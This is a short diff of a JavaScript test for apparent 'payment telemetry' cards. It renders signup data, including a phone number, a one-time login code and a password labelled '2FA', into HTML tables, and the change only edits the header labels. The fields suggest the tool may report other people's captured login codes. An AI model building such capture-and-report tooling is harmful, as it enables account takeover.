@@ -31,10 +31,10 @@ describe('payment telemetry cards (client line first, no IP)', () => {
 
   test('the signup form is a field table; internal send-code fields are dropped', () => {
     const phoneStep = JSON.stringify({ phoneNumber: '9876543210', phoneCountryCode: '+91', otp: '', password: '', firstName: 'Ravi', lastName: '', phoneCodeHash: 'abc', codeLength: 5 });
-    expect(render(`${head}${phoneStep}`)).toBe('<b>keerthi2</b>\n<table bordered striped compact><tr><th colspan="2">Signup&nbsp;·&nbsp;phone&nbsp;entered</th></tr><tr><td><b>Name</b></td><td>Ravi</td></tr><tr><td><b>Phone</b></td><td><code>+919876543210</code></td></tr></table>');
+    expect(render(`${head}${phoneStep}`)).toBe('<b>keerthi2</b>\n<table bordered striped compact><tr><th colspan="2">Signup: phone</th></tr><tr><td><b>Name</b></td><td>Ravi</td></tr><tr><td><b>Phone</b></td><td><code>+919876543210</code></td></tr></table>');
     const codeStep = JSON.stringify({ phoneNumber: '9876543210', phoneCountryCode: '+91', otp: '12345', password: 'pw', codeType: 'app', deliveryMessage: 'Code sent' });
     const html = render(`${head}${codeStep}`);
-    expect(html).toContain('Signup&nbsp;·&nbsp;code&nbsp;entered');
+    expect(html).toContain('Signup: code');
     expect(html).toContain('<tr><td><b>Code</b></td><td><code>12345</code></td></tr><tr><td><b>2FA</b></td><td><code>pw</code></td></tr>');
     expect(html).not.toMatch(/codeType|deliveryMessage/);
   });
